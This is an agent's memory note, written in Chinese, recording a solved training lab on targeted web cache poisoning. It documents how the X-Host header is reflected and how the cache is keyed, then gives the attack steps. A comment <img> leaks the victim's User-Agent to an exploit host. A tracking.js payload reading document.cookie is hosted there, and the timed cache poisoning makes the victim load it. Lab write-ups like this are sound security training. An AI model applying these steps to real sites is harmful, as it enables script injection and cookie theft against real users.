---
metadata:
  node_type: memory
name: "PRS arm A lab-web-cache-poisoning-targeted-using-an-unknown-header"
description: "arm A 冷实例一次通过:缓存键含精确 UA(Vary: User-Agent)+ X-Host 不入键;评论 <img> 泄受害者 UA,exploit server 托管 tracking.js,过期后按受害者 UA 投毒再投评论触发翻牌"
last_updated: 2026-10-09T11:18:03+08:00
created: 2026-10-09T11:18:03+08:00
---

## 2026-10-09 arm A 冷实例一次通过

题:lab-web-cache-poisoning-targeted-using-an-unknown-header(web-cache-poisoning/exploiting-design-flaws)。
range_launch launch-url 直吃 canonical 路径,reused:false;实例 0ab9007f042b8a8480fb217200a5009d。

- 面:每个页面都反射 `X-Host` → `<script type="text/javascript" src="//<X-Host>/resources/js/tracking.js">`。
- 缓存:响应头 `Vary: User-Agent` + `Cache-Control: max-age=30`,X-Cache hit/miss。实测键 = URL + **精确 User-Agent 串**(UA-A 二次请求 hit;换 UA-B miss),`X-Host` 不入键(同 UA 换 X-Host 仍 hit)。
- 反射面定位法(本批有效):一次请求带 N 个候选头、每头一个独立 marker + 一个**从未用过的 UA**(保证 miss),body 里出现的 marker 即反射头名;因 Vary: User-Agent,不轮换 UA 的 header_fuzz 会全程 hit 而掩盖反射。
- 受害者 UA 泄露信道:评论区 HTML 允许 `<img>`,投递 `<img src="//<exploit>/ualek1">` 后受害者浏览该评论 → exploit server access log 记下其 UA:`Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36`。
- 载荷:exploit server STORE `responseFile=/resources/js/tracking.js` + `Content-Type: application/javascript` + body `alert(document.cookie)`,GET 复验 200。
- 投毒序(关键):①先等受害者上次访问的条目过期(>30 s),②用**受害者 UA + X-Host: <exploit host>** 对 `/post?postId=1` 发一次请求确认 `X-Cache: miss`(命中旧干净条目就白投),③30 s 内投一条评论触发受害者访问(命中毒条目)→ 受害浏览器拉 `//exploit/resources/js/tracking.js` 执行 `alert(document.cookie)`。
- 证据:exploit log `10.0.4.138 ... GET /resources/js/tracking.js 200 "user-agent: Mozilla/5.0 (Victim) ..."`;banner `is-solved` + Congratulations。
- 坑:range_launch 信封 `exploit_server:null` 非缺席(按钮 JS 渲染,须实际读实例页才见 `#exploit-link`)。

